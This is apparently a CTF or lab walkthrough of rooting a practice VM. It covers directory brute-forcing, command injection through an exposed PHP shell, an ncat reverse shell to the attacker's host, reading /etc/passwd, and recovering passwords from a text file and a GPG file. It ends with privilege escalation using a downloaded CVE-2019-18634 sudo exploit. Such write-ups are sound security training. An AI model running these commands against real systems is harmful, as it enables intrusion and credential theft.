	- nmap tells us that there are 4 entries in robots.txt
	
#lets use dirb and see what else we can find
$dirb  http://192.168.1.9/ /home/cihan/Desktop/Me/SecLists/raft/data/wordlists/raft-large-directories.txt
	
	- dirb resu≈üt is /server-status and we do not have permisson to access
	- so we stick to what we have found on robots.txt
	- /dev_shell.php
	- when we go to that page we see that it is a php shell
	- try cat /etc/passwd do not work try cd ; cat /etc/passwd again doesnot work
	- try cd && cat /etc/password   it works 
	
	- now it is time to get a shell
	- set up listener on the local machine
	
$nc -lnvp 4444
	- and get the reverse shell from the php shell
	
	- before this I want to learn the path to ncat on the victim machine
	
$ whereis ncat
/usr/bin/ncat 

	- and the final payload I have created  is 
	
$ echo "" && /usr/bin/ncat  192.168.1.8 4444 -e /bin/bash

- yes now we got the connection


lets navigate around the server so that we find what it has to offer us

$cat /etc/passwd



bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash

- we see this users and their home directory

- when I was nagivating through the server I found a file called theadminisdumb.txt in elliots home directory
- when a read it with cat comman
- I found a bunch of explanation about admin and other users and also his password   "theadminisdumb"

-now lets make an ssh connection with his account

$ ssh -l elliot 192.168.1.5 -p 25486

and we are in


lets dig deeper 
when I was looking in bob user directory I found a bunch of files

lets look into bobs directory

$ cd /home/bob/Documents

$ ls -la



total 20
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 18 bob bob 4096 Mar  8  2018 ..
drwxr-xr-x  3 bob bob 4096 Mar  5  2018 Secret
-rw-r--r--  1 bob bob   91 Mar  5  2018 login.txt.gpg
-rw-r--r--  1 bob bob  300 Mar  4  2018 staff.txt


login.txt.gpg seems to be a password containinig file 

$ file login.txt.gnp

login.txt.gpg: GPG symmetrically encrypted data (AES cipher)

it is a gpg encrypted file

lets try to decrypt it 

$ gpg -d login.txt.gpg

it requiress a password phrase

let find the phrase, as you see there is a directory called Secret

$cd Secret
$ls -la

drwxr-xr-x 3 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
drwxr-xr-x 4 bob bob 4096 Mar  5  2018 Keep_Out


$cd Keep_Out ; ls -la

total 16
drwxr-xr-x 4 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 Not_Porn
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 Porn

these are two directories. In Porn directory there is a file called No_porn_4_u   and I tried this to be a passphrase
but it wasnt

In not Porn directory there is a script called notes.sh
execute it and output is 


-= Notes =-
Harry Potter is my faviorite
Are you the real me?
Right, I'm ordering pizza this is going nowhere
People just don't get me
Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>
Cucumber
Rest now your eyes are sleepy
Are you gonna stop reading this yet?
Time to fix the server
Everyone is annoying
Sticky notes gotta buy em


I tried a lot of things here but they were not password and finally I tried first latter of each line "HARPOCRATES"
bum we got the passphrase


lets decrypt the file

cpy the file to /tmp and change name as login.asc

$cp login.txt.gpg /tmp
$mv login.txt.gpg login.asc


$ gpg -d login.txt.gpg 

gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_

see username is bob and password is b0bcat_


now lets make an ssh connection using bobs account

I have written a small script to find out which port is being used for ssh

#!/bin/bash
for port in `seq 1 65500` ;
do
  nc localhost $port 2>/dev/null;
  echo $port
done


$ ssh -l bob localhost -p 25468

till now we have owned two users  now its time to read flag.txt file which is located in / (root directory)

$ ls -la

it readeable only by root

lets do a privilege escalation
download linux exploit suggester

$wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

and execute it and it suggest that the machine is vulnerable to CVE-2019-18634

lets download the executeable code for this and upload it to the vulnerable machine



$ git clone https://github.com/Plazmaz/CVE-2019-18634.git

$zip -r cve.zip  CVE

$scp cve.zip bob@192.168.1.5:/tmp

and go to the vulnerable machine

unzip the file and execute comand

$sudo ./self-contained.sh
